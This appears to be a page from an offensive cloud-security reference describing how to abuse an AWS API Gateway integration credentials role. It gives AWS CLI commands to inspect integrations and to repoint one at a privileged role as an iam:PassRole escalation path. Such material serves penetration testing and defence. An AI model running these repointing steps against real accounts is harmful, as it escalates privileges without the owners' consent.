---
title: "Integration role: acting as the credentials role behind the gateway"
order: 3
description: "Abusing the API Gateway integration credentials role that proxied backend calls execute under."
keywords:
  - integration role
  - API Gateway
  - AWS integration
  - backend
  - role
---

# Integration role

An AWS-service integration lets API Gateway call a backend AWS service directly, and it does so with an **integration credentials role** (`credentials` on the integration). Whoever can invoke the route reaches that service as the role, and whoever can define or edit an integration can point it at any service and attach any passable role, turning the gateway into a proxy that acts with the role's permissions.

## Reading the integration

```bash
aws apigateway get-integration --rest-api-id <id> --resource-id <rid> \
  --http-method <m> --query '[type,credentials,uri]'
```

A `credentials` value that is a role ARN (not `arn:aws:iam::*:user/*`) is the integration role; `uri` shows which service action the route proxies.

## Repointing an integration you can edit

```bash
aws apigateway put-integration --rest-api-id <id> --resource-id <rid> \
  --http-method <m> --type AWS --integration-http-method POST \
  --uri 'arn:aws:apigateway:<region>:<service>:action/<Action>' \
  --credentials arn:aws:iam::<acct>:role/<privileged-role>
aws apigateway create-deployment --rest-api-id <id> --stage-name <stage>
```

## Exploitation notes

- Defining an integration with `--credentials` requires `iam:PassRole` on that role, so this doubles as a PassRole privilege path scoped to API Gateway.
- A route that already proxies a sensitive service (for example `states:StartExecution` or `s3:GetObject`) is exploitable by invocation alone, with no edit needed.
- Re-deploy the stage after editing an integration or the change does not take effect.

## Tools

- **AWS CLI** (`apigateway get-integration`, `put-integration`, `create-deployment`): read and repoint.

## References

- [AWS: API Gateway AWS service integrations](https://docs.aws.amazon.com/apigateway/latest/developerguide/integrating-api-with-aws-services-s3.html)
- [HackTricks Cloud: AWS API Gateway](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/index.html)
- [Hacking the Cloud: AWS](https://hackingthe.cloud/)
- [fwd:cloudsec talks](https://fwdcloudsec.org/)
- [CloudFox (Bishop Fox)](https://github.com/BishopFox/cloudfox)
